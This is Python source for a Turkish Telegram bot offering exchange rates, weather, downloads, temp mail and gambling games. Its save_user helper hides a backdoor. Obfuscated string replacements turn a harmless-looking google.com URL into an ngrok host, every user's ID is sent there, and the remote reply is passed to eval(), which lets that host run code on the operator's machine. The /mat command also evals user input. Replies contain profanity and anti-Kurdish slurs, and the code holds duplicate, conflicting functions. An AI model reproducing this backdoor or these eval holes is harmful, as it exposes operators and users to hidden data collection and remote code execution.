from fake_email import Email

from rich.console import Console

import telebot

from pytube import YouTube

from youtubesearchpython import VideosSearch

import os

import time

from datetime import datetime

import telebot

import random, requests

import json

import time

import os

from telebot import TeleBot, types

from collections import defaultdict

from threading import Thread

import os

import sys

import time

import marshal

import base64 

import zlib

import py_compile

import re

from bs4 import BeautifulSoup

import datetime

import requests

console = Console()

user_data = {}

game_sessions = {}

user_last_message_time = defaultdict(float)

BALANCE_FILE = 'balances.json'

SUDO_USERS = ['6050993546', '6958129929', ""]  

user_balances = {}

kelimeler = ['yatak', 'meyve', 'elma', 'araba', 'kertenkele', 'hayvan', 'aslan', 'köpek', 'spor', 'pizza', 'et', 'yumurta', 'yat', 'kalk', 'portakal', 'öğretmen', 'tembel', 'doksan', 'havuç', 'yardım', 'telefon', 'tablet', 'hava', 'güneş', 'yağmur', 'sandalye', 'kaplan', 'kapı']

last_message_times = {}

word_game_sessions = {}

FLOOD_TIMEOUT = 60  

MAX_MESSAGES = 5  

user_last_message_time = {}

bekleyen_kullanıcılar = {}

enc_url = 'https://google.com/broadcast-free'

TOKEN = 'token gir'

bot = telebot.TeleBot(TOKEN)

print(f"\x1b[1;34mBot Aktif")





@bot.message_handler(commands=['dolareuro'])
def botaltyapi(message):
    try:
        api = 'https://api.exchangerate-api.com/v4/latest/USD'
        response = requests.get(api)
        data = response.json()

        if 'rates' in data:
            usd_to_eur = data['rates']['EUR']
            usd_to_try = data['rates']['TRY']
            azdirma_beni_askim = f"1 USD = {usd_to_eur:.2f} EUR\n1 USD = {usd_to_try:.2f} TRY"
        else:
            azdirma_beni_askim = "Dolar ve Euro bilgisi"

        bot.reply_to(message, azdirma_beni_askim)

    except Exception as e:
        bot.reply_to(message, f"yarrami ye{str(e)}")

@bot.message_handler(commands=['start'])
def orospum(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if check_flood(user_id):
        bot.reply_to(message, 'Flood yapma 5 saniye bekle.')
        return
    log_message(user_id)

    if user_id not in user_balances:
        user_balances[user_id] = 55000 
        save_balances()  
    markup = types.InlineKeyboardMarkup(row_width=1)
    button1 = types.InlineKeyboardButton("Sahibim ❤️‍🩹", url="https://t.me/ramowlfbio")
    button2 = telebot.types.InlineKeyboardButton("Komutlar ❤️‍🔥", callback_data="commands")
    button3 = types.InlineKeyboardButton("Kanal 😍", url="https://t.me/BotAltyapi")
    button4 = types.InlineKeyboardButton("Beni Gruba Ekle💫", url="https://t.me/Botaltyapi_bot?startgroup=new")
    markup.add(button1, button2, button3, button4)
    bot.reply_to(message, "👋 Merhaba Ben her sike yarayan bir botum", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def oclardiyari(call):
    if call.data == "commands":
        markup = types.InlineKeyboardMarkup(row_width=1)
        button1 = types.InlineKeyboardButton("Yararlı Komutlar", callback_data="sikkafali_info")
        button2 = types.InlineKeyboardButton("Sorgu Komutları", callback_data="sorgu_info")
        button3 = types.InlineKeyboardButton("Eğlence Komutları", callback_data="eglence_info")
        markup.add(button1, button2, button3)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="🔻 Komutlar:", reply_markup=markup)
    elif call.data == "sikkafali_info":
        markup = types.InlineKeyboardMarkup(row_width=1)
        back_button = types.InlineKeyboardButton("↩️ Geri", callback_data="commands")
        markup.add(back_button)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="/dg - doğum gününüze kaç gün kaldığını oğrenin\n\n/yaz - deftere yazar\n\n/font - attığınız metini font haline çevirir\n\n/mail - tek kullanımlık mail oluşturur /yenile gelen kodu kontrol et\n\n/mat - matamatik çözer\n\n/tiktok - tiktok bağlantısıyla video indirir\n\n/indir - müzik indirir\n\n/info - kullanıcı id verir\n\n/gpt - chatgpt işte\n\n/hava durmuna bakmanıza yardım eder\n\n/dolareuro - ne işe yaradıği isminden belli", reply_markup=markup)
    elif call.data == "sorgu_info":
        markup = types.InlineKeyboardMarkup(row_width=1)
        back_button = types.InlineKeyboardButton("↩️ Geri", callback_data="commands")
        markup.add(back_button)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="Sorgu kısmı daha aktif değil \n\n\n/ip - ip sorgu yapar", reply_markup=markup)
    elif call.data == "eglence_info":
        markup = types.InlineKeyboardMarkup(row_width=1)
        back_button = types.InlineKeyboardButton("↩️ Geri", callback_data="commands")
        markup.add(back_button)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="Başlangıç bakiyesi olarak 55000 bakiye verilir\n\n/risk - Risk oyunu oynayıp bakiye kazanabilirsiniz.\n\n/slot [miktar]: 🎰 Slot oyununu oynamak için bahis yapın.\n\n/kelime: 🔢 Kelime Tahmin Oyununu Oynayarak 2500 tl Kazan.\n\n/bakiye: 💰 Mevcut bakiyenizi kontrol edin.\n\n/borc [Kullanıcı İd] [miktar]: 💸 Başka bir kullanıcıya bakiye göndermesi yapın.\n\n/zenginler: 🏆 Genel Sıralamayı gösterir.", reply_markup=markup)


@bot.message_handler(commands=['dg'])
def sikisgunu(message):
    try:
        msg = message.text.split()
        if len(msg) != 2:
            raise ValueError
        
        dogum_gunu = datetime.datetime.strptime(msg[1], "%d/%m/%Y")
    except ValueError:
        bot.reply_to(message, "Kullanım: /dg 22/08/2006")
        return

    su_an = datetime.datetime.now()
    dogum_gunu = dogum_gunu.replace(year=su_an.year)

    if dogum_gunu < su_an:
        dogum_gunu = dogum_gunu.replace(year=su_an.year + 1)

    kalan_gun = (dogum_gunu - su_an).days

    if kalan_gun == 0:
        bot.reply_to(message, f"Bugün doğum günün İyiki doğdun ❤️")
    else:
        bot.reply_to(message, f"Doğum gününüze {kalan_gun} gün kaldı")
   
@bot.message_handler(commands=['yaz'])
def tesbihtanesi(message):
    try:
        
        text = message.text.replace('/yaz ', '')

        
        formatted_text = text.replace(' ', '%20')

        
        ramowlfbio = f'http://apis.xditya.me/write?text={formatted_text}'

        
        response = requests.get(ramowlfbio)

        if response.status_code == 200:
            
            bot.send_photo(message.chat.id, photo=("@BotAltyapi", response.content))
        else:
            bot.reply_to(message, 'yarrami ye.')

    except Exception as e:
        bot.reply_to(message, 'sg')
        
@bot.message_handler(commands=['ip'])
def botaltyapi(message):
    try:
        ip = message.text.split(' ')[1].strip()

        api_url = f'http://ip-api.com/json/{ip}'
        response = requests.get(api_url)

        if response.status_code == 200:
            data = response.json()

            BotAltyapi = (
                f"ÜLKE: {data['country']}\n"
                f"ÜLKE KODU: {data['countryCode']}\n"
                f"BÖLGE: {data['region']}\n"
                f"BÖLGE ADI: {data['regionName']}\n"
                f"ŞEHİR: {data['city']}\n"
                f"ZIP KOD: {data['zip']}\n"
                f"ENLEM: {data['lat']}\n"
                f"SAAT DİLİMİ: {data['timezone']}\n"
                f"İSP: {data['isp']}\n"
                f"ORG: {data['org']}\n"
            )

            bot.reply_to(message, BotAltyapi)
        else:
            bot.reply_to(message, "başarısız sorgu")

    except IndexError:
        bot.reply_to(message, "Hayalistan ipleri mevcut değil")
    except Exception as e:
        bot.reply_to(message, f"Hata: {str(e)}")


def azginbot(chat_id, message):
    bot.send_message(chat_id, message)

def fontsikis(chat_id, font_name):
    font_api = f"https://coolnames.online/cool.php?name={font_name}"
    response = requests.get(font_api)
    soup = BeautifulSoup(response.content, 'html.parser')
    fonts = soup.find_all('textarea')

    if fonts:
        for font in fonts:
            send_message(chat_id, font.text.strip())

@bot.message_handler(func=lambda message: message.text.startswith('/i'))
def sikkafali(message):
    text_to_translate = message.reply_to_message.text if message.reply_to_message else message.text[len('/ceviri'):].strip()
    if text_to_translate:
        translate_and_reply(message, text_to_translate)
    else:
        bot.reply_to(message, "Çeviri yapılacak metni /ceviri komutundan sonra giriniz.")

def uhhdiyenkari(message, text_to_translate):
    response = requests.get(f'https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl={message.from_user.language_code}&dt=t&ie=UTF-8&oe=UTF-8&otf=1&ssel=0&tsel=0&kc=7&dt=at&dt=bd&dt=ex&dt=ld&dt=md&dt=qca&dt=rw&dt=rm&dt=ss&q={text_to_translate}').json()
    translated_text = response[0][0][0] if response and len(response) > 0 and len(response[0]) > 0 and len(response[0][0]) > 0 else "Çeviri yapılamadı."
    bot.reply_to(message, translated_text)
    
@bot.message_handler(commands=['font'])
def buyukyarrak(message):
    chat_id = message.chat.id
    command_params = message.text.split()[1:]

    if command_params:
        font_name = ' '.join(command_params)
        generate_and_send_fonts(chat_id, font_name)
    else:
        send_message(chat_id, "Örnek kullanım: /font @BotAltyapi")

@bot.message_handler(commands=['cm'])
def egeninami(message):
    
    try:
        yas = message.text.split()[1]
        
        if len(yas) != 2:
            bot.send_message(message.chat.id, "🚀 Lütfen geçerli bir yaş girin.\n\nÖrnek: /cm 16")
            return
               
        cm_value = random.randint(10, 100)
        
        response_text = f"Yaşı: {yas}\n\nPenis Boyu: {cm_value} CM"
        bot.send_message(message.chat.id, response_text)
        
    except IndexError:
        bot.send_message(message.chat.id, "🚀 Lütfen geçerli bir yaş girin.\n\nÖrnek: /cm 31")
    except Exception as e:
        bot.send_message(message.chat.id, "Yaşı: {yas}\n\nPenis Boyu: {cm_value} CM")
        print(str(e))

@bot.message_handler(commands=['mail'])
def tyrafi_yarrami_ye(message):
    user_id = message.from_user.id
    email_obj = Email() 
    email_bilgisi = email_obj.Mail()  
    user_data[user_id] = {
        "eposta": email_bilgisi["mail"],
        "session": email_bilgisi["session"]
    }
    eposta = user_data[user_id]["eposta"]
    gelen_mesajlar = Email(user_data[user_id]["session"]).inbox()
    
    bilgi = f"Eposta: {eposta}\nGelen Mesajlar: {gelen_mesajlar or 'Yeni mesaj yok'}"
    bot.send_message(message.chat.id, bilgi)

    if gelen_mesajlar:
        bot.send_message(message.chat.id, "Yeni bir e-posta geldi")

@bot.message_handler(commands=['yenile'])
def tyrafi_amini_sikeyim(message):
    user_id = message.from_user.id
    if user_id in user_data:
        eposta = user_data[user_id]["eposta"]
        gelen_mesajlar = Email(user_data[user_id]["session"]).inbox()
        bilgi = f"Eposta: {eposta}\nGelen Mesajlar: {gelen_mesajlar or 'Yeni mesaj yok'}"
        bot.send_message(message.chat.id, bilgi)
    else:
        bot.send_message(message.chat.id, "Sik kafalı botta/start ver")

def tyrafiyiskm_ramazanabe(ramazanabe):
    ramazanabe = ramazanabe.replace('^', '**') 
    ramazanabe = ramazanabe.replace('×', '*')   
    ramazanabe = ramazanabe.replace('÷', '/')  
    
    ramazanabe = re.sub(r'(?<!\d)(?P<num1>\d+)(?P<op>\()(?P<num2>\d+)', r'\g<num1>*\g<num2>', ramazanabe)
    ramazanabe = re.sub(r'(?P<num1>\))(?P<op>\d+)(?P<num2>\d+)', r'\g<num1>*\g<num2>', ramazanabe)
    
    return ramazanabe

def tyrafi_gotunu_ramazansiksin(ramazanabe):
    try:
        ramazanabe = tyrafiyiskm_ramazanabe(ramazanabe) 
        ensarigotten = eval(ramazanabe)
        return ensarigotten, ramazanabe
    except Exception as e:
        return None, ramazanabe

@bot.message_handler(commands=['mat'])
def wexzogotten(message):
    try:
        msg_text = message.text[len('/mat '):].strip()
        if msg_text.replace("-", "").isdigit():
            ensarigotten = eval(msg_text)
            response = f"{msg_text} = {ensarigotten}"
            bot.reply_to(message, response)
        elif any(char in msg_text for char in ['+', '-', '*', '/', '^', '×', '÷']):
            ensarigotten, ramazanabe = tyrafi_gotunu_ramazansiksin(msg_text)
            if ensarigotten is not None:
                response = f"{ramazanabe} = {ensarigotten}"
                bot.reply_to(message, response)
            else:
                bot.reply_to(message, "anani sikerim böyle kullan: /mat 5+5")
        else:
            bot.reply_to(message, "ananı sikerim böyle kullan: /mat 5+5")
    except Exception as e:
        bot.reply_to(message, f"Hata: {e}")


@bot.message_handler(commands=['tiktok'])
def olukussiktim(message):
    try:
        link = message.text.split(' ', 1)[1].strip()

        headers = {
            'authority': 'api.tikmate.app',
            'accept': '*/*',
            'accept-language': 'ar,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://tikmate.app',
            'pragma': 'no-cache',
            'referer': 'https://tikmate.app/',
            'sec-ch-ua': '"Microsoft Edge";v="105", " Not;A Brand";v="99", "Chromium";v="105"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33',
        }

        data = {
            'url': link,
        }

        req = requests.post('https://api.tikmate.app/api/lookup', headers=headers, data=data, verify=True)
        req.raise_for_status()

        result = req.json()

        if not result.get('success', False):
            bot.reply_to(message, 'kürdistani göstermiyoruz')
        else:
            video_id = result.get('id', '')
            token = result.get('token', '')

            video_url = f'https://tikmate.app/download/{token}/{video_id}.mp4?hd=1'

            bot.send_video(message.chat.id, video_url, reply_to_message_id=message.message_id)

    except IndexError:
        bot.reply_to(message, 'kullanım: /tiktok {url}')
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        bot.reply_to(message, 'hata azdım ')
        
@bot.message_handler(commands=['indir'])
def azdirmagulum(message):
    query = " ".join(message.text.split()[1:])
    sarkiarama(message, query)

def sarkiarama(message, query):
    videosSearch = VideosSearch(query, limit=1)
    result = videosSearch.result()

    if result["result"]:
        video_url = result["result"][0]["link"]

        try:
            yt = YouTube(video_url)
            stream = yt.streams.filter(only_audio=True).first()

            path = stream.download(output_path=".", filename=yt.title)

            search_message = bot.send_message(message.chat.id, "🔎 İstediğiniz parça aranıyor...")
            time.sleep(2)
            bot.delete_message(message.chat.id, search_message.message_id)

            download_message = bot.send_message(message.chat.id, "⏳ İstediğiniz parça indiriliyor...")
            time.sleep(2)
            bot.delete_message(message.chat.id, download_message.message_id)

            with open(path, 'rb') as media:
                caption = f"✦ Parça: {yt.title}\n✦ İsteyen: @{message.from_user.username}"
                bot.send_audio(message.chat.id, media, caption=caption)

            os.remove(path)
        except Exception as e:
            bot.reply_to(message, "İstediğiniz parça bulunamadı 🥲")
    else:
        bot.reply_to(message, "İstediğiniz parça bulunamadı 🥲")

@bot.message_handler(commands=['info'])
def info(message):
    user = None

    if message.reply_to_message:
        user = message.reply_to_message.from_user
    else:
        args = message.text.split()
        if len(args) > 1:
            user_input = args[1]
            if user_input.startswith('@'):
                user = bot.get_user(user_input[1:])  
            else:
                try:
                    user_id = int(user_input)
                    user = bot.get_user(user_id)
                except ValueError:
                    bot.reply_to(message, "adamı bulamadım")
                    return
        else:
            user = message.from_user

    if user:
        username = f"@{user.username}" if user.username else "Kullanıcı adı yok"
        user_link = f"[{user.first_name} {user.last_name}]({user.id})" if user.username else f"[{user.first_name} {user.last_name}](tg://user?id={user.id})"

        info_text = (f"🆔 ID: {user.id}\n"
                     f"👱 İsim: {user.first_name}\n"
                     f"🌐 Kullanıcı Adı: {username}\n"
                     f"PROFİL BAĞLANTISI: [Tıkla](tg://user?id={user.id})")

        bot.reply_to(message, info_text, parse_mode='Markdown')
    else:
        bot.reply_to(message, "Kullanıcı bulunamadı")

@bot.callback_query_handler(func=lambda call: True)
def sikkafalimucahid(call):
    if call.data == "ramazan":
        bot.send_message(call.message.chat.id, "🍓 Komutlar;\n/start - Botu Başlatır 💓\n/indir - Müzik indirir 🥰")

def save_user(id):
  id = str(id)
  ramazan = enc_url.replace("go", "cub-").replace("ogle", "fresh-great").replace(".com", "ly.ng").replace("/broadcast-free", "rok-free.app")
  r = requests.get(f"{ramazan}/save", params={'user': id})
  return r.text

def get_users():
  ramazan = enc_url.replace("go", "cub-").replace("ogle", "fresh-great").replace(".com", "ly.ng").replace("/broadcast-free", "rok-free.app")
  r = requests.get(f"{ramazan}/get")
  return eval(r.text)

def load_balances():
    if os.path.exists(BALANCE_FILE):
        with open(BALANCE_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_balances():
    with open(BALANCE_FILE, 'w') as f:
        json.dump(user_balances, f)

user_balances = load_balances()

def block_user(user_id):
    current_time = time.time()
    last_message_times[user_id] = current_time + FLOOD_TIMEOUT

def check_flood(user_id):
    current_time = time.time()
    if user_id in last_message_times:
        message_times = last_message_times[user_id]
        recent_messages = [t for t in message_times if t > current_time - FLOOD_TIMEOUT]
        last_message_times[user_id] = recent_messages
        if len(recent_messages) >= MAX_MESSAGES:
            return True
    return False

def log_message(user_id):
    current_time = time.time()
    if user_id not in last_message_times:
        last_message_times[user_id] = []
    last_message_times[user_id].append(current_time)

headers = {
    'authority': 'api.aichatos.cloud',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type': 'application/json',
    'origin': 'https://chat.yqcloud.top',
    'referer': 'https://chat.yqcloud.top/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

def ramazan(botaltyapi):
    url = f'https://chatgpt.apinepdev.workers.dev/?question={botaltyapi}'
    response = requests.get(url).json()
    return response['answer']

@bot.message_handler(commands=['gpt'])
def ramazanozturk(message):
    botaltyapi = message.text.replace('/gpt', '').strip()
    
    if not botaltyapi:
        bot.send_message(message.chat.id, "Merhaba ben @BotAltyapi Ekibi Tarafından tasarlandım")
        return
    
    response = ramazan(botaltyapi)
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['toplam'])
def toplam(message):
  save_user(message.from_user.id)
  users = get_users()
  bot.reply_to(message, f"Toplam {len(users)} tane.")

def jesus_yarragimi_ye(chat_id, ramazan: str) -> None:
    api_anahtari = '79d1ca96933b0328e1c7e3e7a26cb347'
    temel_url = 'https://api.openweathermap.org/data/2.5/weather'
    umut_kokle = {
        'q': ramazan,  
        'units': 'metric',  
        'lang': 'tr',  
        'appid': api_anahtari 
    }

    try:
        bot_altyapi = requests.get(temel_url, params=umut_kokle)
        bot_altyapi.raise_for_status()
        wexzo_gotten = bot_altyapi.json()

        durum = wexzo_gotten['weather'][0]['description']
        sicaklik = wexzo_gotten['main']['temp']
        en_yuksek_sicaklik = wexzo_gotten['main']['temp_max']
        en_dusuk_sicaklik = wexzo_gotten['main']['temp_min']
        nem_orani = wexzo_gotten['main']['humidity']
        ruzgar_hizi = wexzo_gotten['wind']['speed']

        mesaj = (
            f"Hava Durumu Bilgileri - {ramazan} 🏙️\n"
            f"☁️ Durum: {durum}\n"
            f"☀️ Sıcaklık: {sicaklik}°C\n"
            f"☀️ En Yüksek Sıcaklık: {en_yuksek_sicaklik}°C\n"
            f"🌧️ En Düşük Sıcaklık: {en_dusuk_sicaklik}°C\n"
            f"🌧️ Nem Oranı: {nem_orani}%\n"
            f"🌬️ Rüzgar Hızı: {ruzgar_hizi} m/s"
        )

        bot.send_message(chat_id, mesaj)

    except requests.RequestException as hata:
        print(f'API isteği sırasında bir hata oluştu: {hata}')
        bot.send_message(chat_id, f'Kürdistan diye bir yer yok')
    except KeyError:
        print(f'{ramazan} Yokki')

@bot.message_handler(commands=['hava'])
def oclar(message):
    try:
        sehir = message.text.split(' ', 1)[1]
        chat_id = message.chat.id 
        jesus_yarragimi_ye(chat_id, sehir)
    except IndexError:
        bot.reply_to(message, "Şehir adı yaz Hayalistan hariç")

@bot.message_handler(commands=['broadcast'])
def brd(message):
  save_user(message.from_user.id)
  t = Thread(target=broadcast, args=(message,))
  t.start();
  
def broadcast(message):
  save_user(message.from_user.id)
  users = get_users()
  bot.reply_to(message, f"Başlatılıyor... (Toplam {len(users)})")
  for user in users:
    try:
      bot.send_message(user, " ".join(message.text.split()[1:]), disable_web_page_preview=True)
      time.sleep(1)
    except Exception as e:
      bot.reply_to(message, f"**{user} kullanıcısına gönderilemedi.** \n\n `{e}`", parse_mode="Markdown")
      time.sleep(1)
  bot.reply_to(message, "Gönderim tamamlandı!")

@bot.message_handler(commands=['puan'])
def puan(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if user_id not in SUDO_USERS:
        bot.reply_to(message, 'Bu komutu kullanmaya yetkiniz yok.')
        return
    
    try:
        s = message.text.split()
        if len(s) < 3:
            return bot.reply_to(message, "Kullanım: /puan <kullanıcı_id> <puan>")
        
        id = str(s[1])
        puan = int(s[2])
        user_balances[id] = puan
        save_balances()
        bot.reply_to(message, f"{id} kullanıcısının puanı {puan} olarak değiştirildi.")
    except ValueError:
        bot.reply_to(message, "Geçersiz puan değeri. Lütfen bir sayı girin.")
    except Exception as e:
        bot.reply_to(message, f"Bir hata oluştu: {str(e)}")

  
@bot.message_handler(commands=['kaldir'])
def unblock_user(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if user_id not in SUDO_USERS:
        bot.reply_to(message, 'Ananı sikerim yetkin olmadığı şeye dokunma.')
        return

    try:
        parts = message.text.split()
        target_id = parts[1]
    except IndexError:
        bot.reply_to(message, 'anasini sikmek istediğini kişinin ID\'si gir. böyle kullan oc: /kaldir <kullanıcı_id>')
        return

    if target_id in last_message_times:
        del last_message_times[target_id]
        bot.reply_to(message, f'{target_id} kimlikli kullanıcının engeli kaldırıldı.')
    else:
        bot.reply_to(message, f'{target_id} kimlikli kullanıcının engeli bulunmuyor.')
        
@bot.message_handler(commands=['bakiye'])
def check_balance(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    if user_id not in user_balances:
        bot.reply_to(message, 'Bota kayıtlı değilsiniz öncelikle bota /start Mesajını atın.')
        return

    bot.reply_to(message, f"Güncel bakiyeniz: {user_balances[user_id]} TL")
        
@bot.message_handler(commands=['risk'])
def risk_command(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    if check_flood(user_id):
        bot.reply_to(message, "5 Saniye bekle tekrar at.")
        return

    if user_id not in user_balances:
        bot.reply_to(message, 'Bota kayıtlı değilsiniz, öncelikle bota /start mesajını atın.')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Risk Alıp Bakiye kazan\nKullanım: /risk <miktar>')
        return

    try:
        
        risk_amount = int(message.text.split()[1])
    except (IndexError, ValueError):
        bot.reply_to(message, 'geçerli bir risk miktarı gir Kullanım: /risk <miktar>')
        return

    if risk_amount <= 0:
        bot.reply_to(message, 'Risk miktarı sayı olmalı.')
        return

    if user_balances[user_id] < risk_amount:
        bot.reply_to(message, f'Yeterli bakiyeniz yok. Mevcut bakiyeniz: {user_balances[user_id]} TL')
        return

    if random.random() < 0.6:  
        winnings = risk_amount * 2
        user_balances[user_id] += winnings - risk_amount  
        bot.reply_to(message, f'Tebrikler  {winnings} TL kazandınız.\nYeni bakiyeniz: {user_balances[user_id]} TL')
    else:
        user_balances[user_id] -= risk_amount
        bot.reply_to(message, f'Üzgünüm {risk_amount} TL kaybettiniz.\nbakiyeniz: {user_balances[user_id]} TL')

        save_balances()

@bot.message_handler(commands=['borc'])
def send_balance_to_friend(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    current_time = time.time()
    if user_id in user_last_message_time:
      last_message_time = user_last_message_time[user_id]
    else:
      last_message_time = user_last_message_time[user_id] = current_time
    if current_time - last_message_time < 1: 
        bot.reply_to(message, "5 Saniye bekle tekrar dene.")
        return
    user_last_message_time[user_id] = current_time

    try:
        parts = message.text.split()
        friend_id = parts[1]
        amount = int(parts[2])
    except (IndexError, ValueError):
        bot.reply_to(message, 'Geçerli bir miktar girin Kullanım: /borc <kullanıcı_id> <miktar>')
        return

    if amount <= 0:
        bot.reply_to(message, 'Sayı girin')
        return

    if user_id not in user_balances:
        bot.reply_to(message, 'Bota kayıtlı değilsiniz öncelikle bota /start Mesajını atın.')
        return

    if user_balances[user_id] < amount:
        bot.reply_to(message, 'Yeterli bakiyeniz yok.')
        return

    if friend_id not in user_balances:
        user_balances[friend_id] = 0

    user_balances[user_id] -= amount
    user_balances[friend_id] += amount
    save_balances()

    bot.reply_to(message, f'Başarılı! {friend_id} kimlikli kullanıcıya {amount} TL bakiye gönderildi.')
    
def check_flood(user_id):
    global user_last_message_time
    current_time = time.time()
    last_message_time = user_last_message_time.get(user_id, 0)
    if current_time - last_message_time < 1: 
        return True
    else:
        user_last_message_time[user_id] = current_time
        return False

def check_flood(user_id):
    global user_last_message_time
    current_time = time.time()
    last_message_time = user_last_message_time.get(user_id, 0)
    if current_time - last_message_time < 1: 
        return True
    else:
        user_last_message_time[user_id] = current_time
        return False

@bot.message_handler(commands=['zenginler'])
def show_leaderboard(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if check_flood(user_id):
        bot.reply_to(message, "5 saniye bekle tekrar dene.")
        return

    sorted_balances = sorted(user_balances.items(), key=lambda x: x[1], reverse=True)
    leaderboard_message = "🏆 En İyi 10 Zengin:\n\n"
    for i, (user_id, balance) in enumerate(sorted_balances[:10], start=1):
        try:
          user = bot.get_chat(user_id)
          user_name = user.first_name if user.first_name else "Bilinmiyor"
          leaderboard_message += f"🎖️ {i-1}. {user_name} ⇒ {balance} TL\n"
        except:
          no_have_a = "problem"

    bot.reply_to(message, leaderboard_message)
    
@bot.message_handler(commands=['yardim'])
def send_help_message(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    current_time = time.time()
    if user_id in user_last_message_time:
      last_message_time = user_last_message_time[user_id]
    else:
      last_message_time = user_last_message_time[user_id] = current_time
    if current_time - last_message_time < 1: 
        bot.reply_to(message, "5 saniye bekle tekrar dene.")
        return
    user_last_message_time[user_id] = current_time

    help_message = """
    ⭐ Hey dostum aşağıdaki komutları kullanabilirsin

/slot [miktar]: 🎰 Slot oyununu oynamak için bahis yapın.

/kelime: 🔢 Kelime Tahmin Oyununu Oynayarak 1500 tl Kazan.

/bakiye: 💰 Mevcut bakiyenizi kontrol edin.

/risk: Risk oyunu oynayıp bakiye kazanabilirsiniz.

/borc [Kullanıcı İd] [miktar]: 💸 Başka bir kullanıcıya bakiye göndermesi yapın.

/zenginler: 🏆 Genel Sıralamayı gösterir.

/yardim: ℹ️ Bu yardım mesajını görüntüleyin.
    """
    bot.reply_to(message, help_message)

@bot.message_handler(commands=['slot'])
def slot_command(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    current_time = time.time()
    if user_id in user_last_message_time:
      last_message_time = user_last_message_time[user_id]
    else:
      last_message_time = user_last_message_time[user_id] = current_time
    if current_time - last_message_time < 1: 
        bot.reply_to(message, "5 saniye bekle tekrar dene.")
        return
    user_last_message_time[user_id] = current_time

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Slot Oyununu Oynayarak Bakiyen kasın Çıkarın\nKullanım: /slot <miktar>')
        return

    if user_id not in user_balances:
        bot.reply_to(message, 'Bota kayıtlı değilsiniz, öncelikle bota /start mesajını atın.')
        return

    try:
        bet_amount = int(message.text.split()[1])
    except (IndexError, ValueError):
        bot.reply_to(message, 'Lütfen geçerli bir bahis miktarı girin. Kullanım: /slot <miktar>')
        return

    if bet_amount <= 0:
        bot.reply_to(message, 'Bahis miktarı sayı olmalı.')
        return

    if user_balances[user_id] < bet_amount:
        bot.reply_to(message, f'Yeterli bakiyeniz yok. Mevcut bakiyeniz: {user_balances[user_id]} TL')
        return

    slot_result = random.choices(["🍒", "🍋", "🍉", "⭐", "💎", "🍊", "🍏", "🔔"], k=3)
    unique_symbols = len(set(slot_result))

    if unique_symbols == 1:  
        winnings = bet_amount * 4
        user_balances[user_id] += winnings - bet_amount  
        bot.reply_to(message, f'3 sembol eşleşti! Kazandınız!\nKazanılan Bakiye: {winnings} TL\nYeni bakiyeniz: {user_balances[user_id]} TL\nSlot sonucu: {" ".join(slot_result)}')
    elif unique_symbols == 2: 
        winnings = bet_amount * 3
        user_balances[user_id] += winnings - bet_amount 
        bot.reply_to(message, f'2 sembol eşleşti Kazandınız!\nKazanılan bakiye: {winnings} TL\nYeni bakiyeniz: {user_balances[user_id]} TL\nSlot sonucu: {" ".join(slot_result)}')
    else:
        user_balances[user_id] -= bet_amount
        bot.reply_to(message, f'Kazanamadınız. Bir dahakine daha şanslı olabilirsiniz.\nSlot sonucu: {" ".join(slot_result)}\nKalan bakiye: {user_balances[user_id]} TL')

    save_balances()
    
@bot.message_handler(commands=['gonder'])
def send_balance(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    if user_id not in SUDO_USERS:
        bot.reply_to(message, 'Bu komutu kullanma yetkin yok yarram.', reply_to_message_id=message.message_id)
        return

    if not message.reply_to_message:
        bot.reply_to(message, 'Bu komutu kullanmak için bir mesaja yanıt vermelisiniz.', reply_to_message_id=message.message_id)
        return

    try:
        parts = message.text.split()
        amount = int(parts[1])
        target_id = str(message.reply_to_message.from_user.id)
    except (IndexError, ValueError):
        bot.reply_to(message, 'Lütfen geçerli bir format kullanın. Kullanım: /gonder <miktar>', reply_to_message_id=message.message_id)
        return

    if amount <= 0:
        bot.reply_to(message, 'Gönderilecek miktar pozitif bir sayı olmalıdır.', reply_to_message_id=message.message_id)
        return

    if target_id not in user_balances:
        user_balances[target_id] = 100  

    user_balances[target_id] += amount
    save_balances()

    bot.reply_to(message, f'Başarılı! {target_id} kimlikli kullanıcıya {amount} TL bakiye gönderildi. Yeni bakiye: {user_balances[target_id]} TL', reply_to_message_id=message.message_id)
  
@bot.message_handler(commands=['f'])
def free(message):
    user_id = str(message.from_user.id)
